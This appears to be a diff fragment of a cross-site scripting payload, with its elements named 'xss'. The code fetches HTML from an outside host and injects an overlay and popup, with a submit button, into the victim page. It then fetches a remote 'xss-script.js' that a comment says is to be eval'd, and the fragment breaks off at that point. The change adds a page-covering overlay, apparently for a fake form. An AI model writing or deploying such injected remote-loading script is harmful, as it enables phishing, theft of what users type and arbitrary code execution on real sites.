@@ -40,18 +40,20 @@ fetch('https://data.estebanmf.space/xss')
 .then(t => t.text())
 .then(d => {
 console.log('Fetched HTML:', d);
-// Create a temporary div to parse the popup
+// Create a temporary div to parse the popup and overlay
 const tempDiv = document.createElement('div');
 tempDiv.innerHTML = d;
+const overlay = tempDiv.querySelector('#xss-overlay');
 const popup = tempDiv.querySelector('#xss-popup');
-if (!popup) {
-console.error('Popup div not found in fetched HTML');
+if (!overlay || !popup) {
+console.error('Overlay or popup div not found in fetched HTML');
 return;
 }
-// Append popup to existing body
+// Append overlay and popup to existing body
+document.body.appendChild(overlay);
 document.body.appendChild(popup);
-console.log('Popup appended to body');
-console.log('Checking if submit-btn exists:', !!document.getElementById('submit-btn'));
+console.log('Overlay and popup appended to body');
+console.log('Checking if xss-submit-btn exists:', !!document.getElementById('xss-submit-btn'));
 // Fetch and eval xss-script.js
 fetch('https://data.estebanmf.space/xss-script.js')
 .then(t => t.text())
